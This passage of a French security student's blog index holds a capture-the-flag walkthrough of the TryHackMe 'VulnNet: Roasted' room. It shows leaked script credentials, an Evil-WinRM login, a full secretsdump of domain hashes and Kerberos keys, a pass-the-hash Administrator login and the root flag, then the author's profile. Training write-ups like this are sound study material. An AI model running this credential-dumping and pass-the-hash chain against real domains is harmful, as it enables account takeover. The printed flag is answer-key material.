DNS domain name from RootDSE object. 22Set objRootDSE = GetObject(\u0026#34;LDAP://RootDSE\u0026#34;) 23strDNSDomain = objRootDSE.Get(\u0026#34;defaultNamingContext\u0026#34;) 24 25\u0026#39; Use the NameTranslate object to find the NetBIOS domain name from the 26\u0026#39; DNS domain name. 27Set objTrans = CreateObject(\u0026#34;NameTranslate\u0026#34;) 28objTrans.Init ADS_NAME_INITTYPE_GC, \u0026#34;\u0026#34; 29objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain 30strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4) 31\u0026#39; Remove trailing backslash. 32strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1) 33 34\u0026#39; Use the NameTranslate object to convert the NT user name to the 35\u0026#39; Distinguished Name required for the LDAP provider. 36On Error Resume Next 37objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain \u0026amp; \u0026#34;\\\u0026#34; \u0026amp; strUserNTName 38If (Err.Number \u0026lt;\u0026gt; 0) Then 39 On Error GoTo 0 40 Wscript.Echo \u0026#34;User \u0026#34; \u0026amp; strUserNTName _ 41 \u0026amp; \u0026#34; not found in Active Directory\u0026#34; 42 Wscript.Echo \u0026#34;Program aborted\u0026#34; 43 Wscript.Quit 44End If 45strUserDN = objTrans.Get(ADS_NAME_TYPE_1779) 46\u0026#39; Escape any forward slash characters, \u0026#34;/\u0026#34;, with the backslash 47\u0026#39; escape character. All other characters that should be escaped are. 48strUserDN = Replace(strUserDN, \u0026#34;/\u0026#34;, \u0026#34;\\/\u0026#34;) 49 50\u0026#39; Bind to the user object in Active Directory with the LDAP provider. 51On Error Resume Next 52Set objUser = GetObject(\u0026#34;LDAP://\u0026#34; \u0026amp; strUserDN) 53If (Err.Number \u0026lt;\u0026gt; 0) Then 54 On Error GoTo 0 55 Wscript.Echo \u0026#34;User \u0026#34; \u0026amp; strUserNTName _ 56 \u0026amp; \u0026#34; not found in Active Directory\u0026#34; 57 Wscript.Echo \u0026#34;Program aborted\u0026#34; 58 Wscript.Quit 59End If 60objUser.SetPassword strPassword 61If (Err.Number \u0026lt;\u0026gt; 0) Then 62 On Error GoTo 0 63 Wscript.Echo \u0026#34;Password NOT reset for \u0026#34; \u0026amp;vbCrLf \u0026amp; strUserNTName 64 Wscript.Echo \u0026#34;Password \u0026#34; \u0026amp; strPassword \u0026amp; \u0026#34; may not be allowed, or\u0026#34; 65 Wscript.Echo \u0026#34;this client may not support a SSL connection.\u0026#34; 66 Wscript.Echo \u0026#34;Program aborted\u0026#34; 67 Wscript.Quit 68Else 69 objUser.AccountDisabled = False 70 objUser.Put \u0026#34;pwdLastSet\u0026#34;, 0 71 Err.Clear 72 objUser.SetInfo 73 If (Err.Number \u0026lt;\u0026gt; 0) Then 74 On Error GoTo 0 75 Wscript.Echo \u0026#34;Password reset for \u0026#34; \u0026amp; strUserNTName 76 Wscript.Echo \u0026#34;But, unable to enable account or expire password\u0026#34; 77 Wscript.Quit 78 End If 79End If 80On Error GoTo 0 81 82Wscript.Echo \u0026#34;Password reset, account enabled,\u0026#34; 83Wscript.Echo \u0026#34;and password expired for user \u0026#34; \u0026amp; strUserNTName# HOP ! On a des credentials:\n1strUserNTName = \u0026#34;a-whitehat\u0026#34; 2strPassword = \u0026#34;bNdKVkjv3RR9ht\u0026#34; privesc On peut maintenant se connecter à la machine avec Evil-WinRM:\n1[May 12, 2024 - 12:24:24 (UTC)] exegol-thm VulnNet: Roasted # evil-winrm -i 10.10.211.33 -u \u0026#39;a-whitehat\u0026#39; -p \u0026#39;bNdKVkjv3RR9ht\u0026#39; 2 3 4Evil-WinRM shell v3.5 5 6Info: Establishing connection to remote endpoint 7*Evil-WinRM* PS C:\\Users\\a-whitehat\\Documents\u0026gt; dir 8*Evil-WinRM* PS C:\\Users\\a-whitehat\\Documents\u0026gt; whoami /all 9 10USER INFORMATION 11---------------- 12 13User Name SID 14====================== ============================================= 15vulnnet-rst\\a-whitehat S-1-5-21-1589833671-435344116-4136949213-1105 16 17 18GROUP INFORMATION 19----------------- 20 21Group Name Type SID Attributes 22================================================== ================ ============================================ =============================================================== 23Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group 24BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group 25BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group 26BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner 27NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group 28NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group 29NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group 30VULNNET-RST\\Domain Admins Group S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group 31VULNNET-RST\\Denied RODC Password Replication Group Alias S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group 32NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group 33Mandatory Label\\High Mandatory Level Label S-1-16-12288 34 35 36PRIVILEGES INFORMATION 37---------------------- 38 39Privilege Name Description State 40========================================= ================================================================== ======= 41SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled 42SeMachineAccountPrivilege Add workstations to domain Enabled 43SeSecurityPrivilege Manage auditing and security log Enabled 44SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled 45SeLoadDriverPrivilege Load and unload device drivers Enabled 46SeSystemProfilePrivilege Profile system performance Enabled 47SeSystemtimePrivilege Change the system time Enabled 48SeProfileSingleProcessPrivilege Profile single process Enabled 49SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled 50SeCreatePagefilePrivilege Create a pagefile Enabled 51SeBackupPrivilege Back up files and directories Enabled 52SeRestorePrivilege Restore files and directories Enabled 53SeShutdownPrivilege Shut down the system Enabled 54SeDebugPrivilege Debug programs Enabled 55SeSystemEnvironmentPrivilege Modify firmware environment values Enabled 56SeChangeNotifyPrivilege Bypass traverse checking Enabled 57SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled 58SeUndockPrivilege Remove computer from docking station Enabled 59SeEnableDelegationPrivilege Enable computer and user accounts to be trusted for delegation Enabled 60SeManageVolumePrivilege Perform volume maintenance tasks Enabled 61SeImpersonatePrivilege Impersonate a client after authentication Enabled 62SeCreateGlobalPrivilege Create global objects Enabled 63SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 64SeTimeZonePrivilege Change the time zone Enabled 65SeCreateSymbolicLinkPrivilege Create symbolic links Enabled 66SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 67 68 69USER CLAIMS INFORMATION 70----------------------- 71 72User claims unknown. 73 74Kerberos support for Dynamic Access Control on this device has been disabled. Ici on a des informations intéressantes:\nVULNNET-RST\\Domain Admins Une fois que l\u0026rsquo;on a ça on peut penser a faire un secretsdump\nsecretsdump 1[May 12, 2024 - 12:28:48 (UTC)] exegol-thm VulnNet: Roasted # secretsdump VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.211.33 2Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs 3 4[*] Service RemoteRegistry is in stopped state 5[*] Starting service RemoteRegistry 6[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a 7[*] Dumping local SAM hashes (uid:rid:lmhash:nthash) 8Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d::: 9Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 10DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 11[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information. 12[*] Dumping cached domain logon information (domain/username:hash) 13[*] Dumping LSA Secrets 14[*] $MACHINE.ACC 15VULNNET-RST\\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da 16VULNNET-RST\\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0 17VULNNET-RST\\WIN-2BO8M1OE1M1$:des-cbc-md5:e32f734cda85a7ea 18VULNNET-RST\\WIN-2BO8M1OE1M1$:plain_password_hex:63edeac7b7c3c8e4fdf2b0731130beeb27815486e1afe3a870b55e7ec03efe78f9c63885fe1511b2cbe66b5c93abd83bc084c3cfb725d6e6c4a08de89a2a821b182b87880d9c7c62f7bc8c183f200345c06155413f2268def9fe3b02eeb639b77a375356316ead43330ece1a33e9866f2998bf1fca8c56c0caa0656c863996aaf41eed3de33de526e90340e2ff85ad774189857528cc1281c31519c28318c3541a306ecb034631d5b9491ba2e35858c023e4e68af1c7f198e36400bd988f097bbaf069307c6842274a50f1ab8815dc12ea1b7637d684e90e470d1f7c69712e77050cda0bf34b3bce2a3c9a590da9bb7e 19VULNNET-RST\\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a::: 20[*] DPAPI_SYSTEM 21dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419 22dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855 23[*] NL$KM 24 0000 F3 F6 6B 8D 1E 2A F4 8E 85 F6 7A 46 D1 25 A0 D3 ..k..*....zF.%.. 25 0010 EA F4 90 7D 2D CB A5 8C 88 C5 68 4C 1E D3 67 3B ...}-.....hL..g; 26 0020 DB 31 D9 91 C9 BB 6A 57 EA 18 2C 90 D3 06 F8 31 .1....jW..,....1 27 0030 7C 8C 31 96 5E 53 5B 85 60 B4 D5 6B 47 61 85 4A |.1.^S[.`..kGa.J 28NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a 29[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) 30[*] Using the DRSUAPI method to get NTDS.DIT secrets 31Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d::: 32Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 33krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32::: 34vulnnet-rst.local\\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf::: 35vulnnet-rst.local\\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b::: 36vulnnet-rst.local\\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b::: 37vulnnet-rst.local\\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a::: 38vulnnet-rst.local\\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022::: 39WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a::: 40[*] Kerberos keys grabbed 41Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83 42Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849 43Administrator:des-cbc-md5:52d325cb2acd8fc1 44krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd 45krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353 46krbtgt:des-cbc-md5:1357f2e9d3bc0bd3 47vulnnet-rst.local\\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3 48vulnnet-rst.local\\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46 49vulnnet-rst.local\\enterprise-core-vn:des-cbc-md5:200e0102ce868016 50vulnnet-rst.local\\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c 51vulnnet-rst.local\\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d 52vulnnet-rst.local\\a-whitehat:des-cbc-md5:028032c2a8043ddf 53vulnnet-rst.local\\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032 54vulnnet-rst.local\\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16 55vulnnet-rst.local\\t-skid:des-cbc-md5:25c2739dcb646bfd 56vulnnet-rst.local\\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad 57vulnnet-rst.local\\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a 58vulnnet-rst.local\\j-goldenhand:des-cbc-md5:c4e65d49feb63180 59vulnnet-rst.local\\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62 60vulnnet-rst.local\\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9 61vulnnet-rst.local\\j-leet:des-cbc-md5:0815580254a49854 62WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da 63WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0 64WIN-2BO8M1OE1M1$:des-cbc-md5:1f579149bc9252e6 65[*] Cleaning up... 66[*] Stopping service RemoteRegistry 67[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on. 68[*] Cleaning up... 69[*] Stopping service RemoteRegistry Nous avons le hash NT de l\u0026rsquo;administrateur:\n1Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d::: evil-winrm On peut maintenant se connecter à la machine avec Evil-WinRM:\n1[May 12, 2024 - 12:32:52 (UTC)] exegol-thm VulnNet: Roasted # evil-winrm -i 10.10.211.33 -u \u0026#39;Administrator\u0026#39; -H \u0026#39;c2597747aa5e43022a3a3049a3c3b09d\u0026#39; 2 3 4Evil-WinRM shell v3.5 5 6Info: Establishing connection to remote endpoint 7*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami 8vulnnet-rst\\administrator 9*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; Get-Content \u0026#34;C:/Users/Administrator/Desktop/system.txt\u0026#34; 10THM{16f45e3934293a57645f8d7bf71d8d4c} 11*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; exit 12 13Info: Exiting with code 0 On a récupéré le flag root THM{16f45e3934293a57645f8d7bf71d8d4c}.\nVoilà, c\u0026rsquo;est terminé pour cette room. J\u0026rsquo;espère que vous avez apprécié. Si vous avez des questions ou des suggestions n\u0026rsquo;hésitez pas à me contacter sur linkedin.\n","date":"March 26, 2024","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/news/2024/03/vulnnet-roasted/","series":[{"title":"News","url":"/series/news/"}],"smallImg":"","tags":[{"title":"Active Directory","url":"/tags/active-directory/"},{"title":"Kerberos","url":"/tags/kerberos/"},{"title":"AS-REP Roasting","url":"/tags/as-rep-roasting/"}],"timestamp":1711411200,"title":"VulnNet Roasted"},{"authors":[],"categories":[],"content":"","date":"January 1, 1","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/contact/","series":[],"smallImg":"","tags":[],"timestamp":-62135596800,"title":"Me Contacter"},{"authors":[],"categories":[],"content":"","date":"January 1, 1","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/offline/","series":[],"smallImg":"","tags":[],"timestamp":-62135596800,"title":"Offline"},{"authors":[],"categories":[],"content":"Je suis un étudiant de 20 ans à YNOV CAMPUS MONTPELLIER, une école spécialisée dans les métiers du numérique . Je suis passioné par les domaines de la Cybersécurité et de l\u0026rsquo;Infrastructure réseaux.\n🚨 Je recherche une alternance dans le cadre de mon BACHELOR 3 INFORMATIQUE qui sera un véritable tremplin en vue de mes objectifs futurs.\nEn plus de mes compétences théoriques, j\u0026rsquo;ai pu acquérir des compétences techniques notamment grâce à mon stage chez MAGEWEB INFORMATIQUE SERVICES. Au sein de ce stage, mes missions sont d\u0026rsquo;effectuer des tests d\u0026rsquo;intrusion dans des environnements virtuels, de créer des logiciels malveillants et de réaliser des projets hardware. Cela me permet d\u0026rsquo;explorer ma passion et me conforte dans l\u0026rsquo;idée de poursuivre dans ce domaine.\nJ\u0026rsquo;aime aussi beaucoup faire des CTF, en particulier sur Hack The Box, TryHackMe et Root Me.\nEn termes de certifications j\u0026rsquo;ai obtenu les certifications suivantes sur\nTryHackMe:\nCompTIA Pentest+ Learning Path Web Fundamentals Learning Path Complete Beginner Learning Path Red Teaming Learning Path Jr Penetration Tester Learning Path Pre Security Learning Path Introduction to Cyber Security Learning Path j\u0026rsquo;ai pour projet de passer OSCP CRTP CRTE CRTO\nN\u0026rsquo;hésitez pas à laisser des commentaires sur mes articles. Vous pouvez donner votre avis, compléter mes informations, me critiquer (constructivement, j'espère !), ou encore corriger mes erreurs.\nVotre participation est essentielle pour m\u0026rsquo;aider à progresser et à devenir une source d\u0026rsquo;information plus fiable et plus complète.\n","date":"January 1, 1","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/about/","series":[],"smallImg":"","tags":[],"timestamp":-62135596800,"title":"Qui Suis-Je ?"}]
